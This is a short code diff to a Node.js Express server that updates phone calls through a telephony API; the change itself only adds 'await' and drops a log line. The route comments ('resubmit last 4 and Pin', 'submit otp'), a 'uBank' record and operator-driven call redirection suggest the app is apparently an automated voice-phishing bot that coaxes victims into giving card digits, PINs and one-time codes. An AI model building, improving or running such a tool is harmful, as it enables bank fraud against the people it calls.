@@ -26,14 +26,13 @@ app.post("/statusChange", async (request, response) => {
 
 app.post("/command", async (request, response) => {
   const { status, CallSid } = request.body;
-  console.log(status);
   await uBank.findOneAndUpdate({ CallSid }, { status }).exec();
   try {
     //1 resubmit last 4 and Pin
     //2 resubmit pin
     //3 submit otp
     if (status == 1) {
-      client
+      await client
         .calls(CallSid)
         .update({
           method: "POST",
@@ -42,7 +41,7 @@ app.post("/command", async (request, response) => {
         .then((call) => console.log(call.to))
         .done();
     } else if (status == 2) {
-      client
+      await client
         .calls(CallSid)
         .update({
           method: "POST",
@@ -51,7 +50,7 @@ app.post("/command", async (request, response) => {
         .then((call) => console.log(call.to))
         .done();
     } else if (status == 4) {
-      client
+      await client
         .calls(CallSid)
         .update({
           method: "POST",
@@ -60,7 +59,7 @@ app.post("/command", async (request, response) => {
         .then((call) => console.log(call.to))
         .done();
     } else if (status == 6) {
-      client
+      await client
         .calls(CallSid)
         .update({
           method: "POST",
